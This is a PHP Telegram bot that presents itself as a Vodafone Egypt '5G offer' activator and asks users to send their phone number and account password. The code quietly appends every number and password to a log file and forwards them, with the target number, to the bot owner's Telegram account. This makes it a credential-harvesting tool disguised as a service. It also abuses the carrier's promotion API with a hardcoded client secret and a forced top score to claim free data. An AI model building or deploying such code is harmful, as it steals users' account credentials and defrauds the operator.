<?php

$bot_token = "7969327577:AAHU_JEXULlN7zsGqQ5lg8ReGEAsKCZupT4";
$admin_id = "6245201082";
$channel_username = "@Aliosma47586";

$update = json_decode(file_get_contents("php://input"), true);
if (!$update || !isset($update["message"])) exit;

$message = $update["message"];
$chat_id = $message["chat"]["id"];
$text = trim($message["text"]);
$user_id = $message["from"]["id"];

if (!is_user_subscribed($user_id)) {
    send_message($chat_id, "📛 يجب الاشتراك أولاً في القناة:
$channel_username");
    exit;
}

if ($text === "/start") {
    send_message($chat_id, "👋 أهلاً بك في بوت فودافون 5G

📲 أرسل البيانات بهذا الشكل:

`رقمك:كلمة_المرور:رقم_المستفيد`

مثال:
01012345678:pass123:01098765432", true);
    exit;
}

if (substr_count($text, ":") === 2) {
    list($number, $password, $number2) = explode(":", $text);
    file_put_contents("log.txt", "$number:$password
", FILE_APPEND);
    $result = activate_offer($number, $password, $number2);
    send_message($chat_id, $result);
    if ($chat_id != $admin_id) {
        send_message($admin_id, "📥 طلب جديد:
📞 $number
🔐 $password
🎯 $number2
📡 $result");
    }
    exit;
}

send_message($chat_id, "❗️يرجى إرسال البيانات بهذا الشكل:

`رقمك:كلمة_المرور:رقم_المستفيد`", true);

function send_message($chat_id, $text, $markdown = false) {
    global $bot_token;
    $url = "https://api.telegram.org/bot$bot_token/sendMessage";
    $data = ["chat_id" => $chat_id, "text" => $text];
    if ($markdown) $data["parse_mode"] = "Markdown";
    file_get_contents($url . "?" . http_build_query($data));
}

function is_user_subscribed($user_id) {
    global $bot_token, $channel_username;
    $url = "https://api.telegram.org/bot$bot_token/getChatMember?chat_id=$channel_username&user_id=$user_id";
    $res = json_decode(file_get_contents($url), true);
    if (!$res || !$res['ok']) return false;
    $status = $res["result"]["status"];
    return in_array($status, ["member", "administrator", "creator"]);
}

function activate_offer($number, $password, $number2) {
    $login_url = "https://mobile.vodafone.com.eg/auth/realms/vf-realm/protocol/openid-connect/token";
    $payload = http_build_query([
        'username' => $number,
        'password' => $password,
        'grant_type' => 'password',
        'client_secret' => '95fd95fb-7489-4958-8ae6-d31a525cd20a',
        'client_id' => 'ana-vodafone-app'
    ]);
    $headers = [
        "User-Agent: okhttp/4.11.0",
        "Accept: application/json",
        "silentLogin: true",
        "x-agent-version: 2024.12.1",
        "x-agent-device: Xiaomi",
        "clientId: AnaVodafoneAndroid",
        "Accept-Language: ar",
        "Content-Type: application/x-www-form-urlencoded"
    ];
    $opts = ['http' => ['method' => "POST", 'header' => implode("
", $headers), 'content' => $payload]];
    $ctx = stream_context_create($opts);
    $resp = file_get_contents($login_url, false, $ctx);
    $json = json_decode($resp, true);
    if (!isset($json["access_token"])) return "❌ فشل تسجيل الدخول. تأكد من البيانات.";

    $token = $json["access_token"];
    $headers[] = "Authorization: Bearer $token";
    $headers[] = "msisdn: $number";

    $url_info = "https://web.vodafone.com.eg/services/dxl/promo/promotion?@type=Promo&\$.context.type=5G_Promo&\$.characteristics%5B@name%3DcustomerNumber%5D.value=$number2";
    $info = json_decode(file_get_contents($url_info, false, stream_context_create(['http' => ['header' => $headers]])), true);
    $current_level = "1";
    $scores = [50];
    if ($info) {
        foreach ($info as $item) {
            foreach ($item["characteristics"] as $c) {
                if ($c["name"] === "currentLevel") $current_level = $c["value"];
                if ($c["name"] === "scores") $scores = array_map("intval", explode(",", $c["value"]));
            }
        }
    }
    $payload2 = json_encode([
        "@type" => "Promo",
        "channel" => ["id" => "APP_PORTAL"],
        "context" => ["type" => "5G_Promo"],
        "pattern" => [[ "characteristics" => [
            ["name" => "level", "value" => $current_level],
            ["name" => "score", "value" => max($scores)],
            ["name" => "customerNumber", "value" => $number2]
        ]]]
    ]);
    $opts2 = ['http' => ['method' => "POST", 'header' => array_merge($headers, ["Content-Type: application/json"]), 'content' => $payload2]];
    $res2 = json_decode(file_get_contents("https://web.vodafone.com.eg/services/dxl/promo/promotion", false, stream_context_create($opts2)), true);
    if (!isset($res2["id"])) return "⚠️ العرض غير متاح أو تم استخدامه اليوم.";
    $promo_id = $res2["id"];
    $mg = $res2["characteristics"][0]["value"];
    $final = json_encode([
        "@type" => "Promo",
        "channel" => ["id" => "APP_PORTAL"],
        "context" => ["type" => "5G_Promo"],
        "pattern" => [[ "characteristics" => [["name" => "customerNumber", "value" => $number2]]]]
    ]);
    $opts3 = ['http' => ['method' => "PATCH", 'header' => array_merge($headers, ["Content-Type: application/json"]), 'content' => $final]];
    $res3 = @file_get_contents("https://web.vodafone.com.eg/services/dxl/promo/promotion/$promo_id", false, stream_context_create($opts3));
    return ($res3 !== false) ? "✅ تم إرسال $mg ميجا بنجاح 🎉" : "❌ فشل التفعيل النهائي.";
}
?>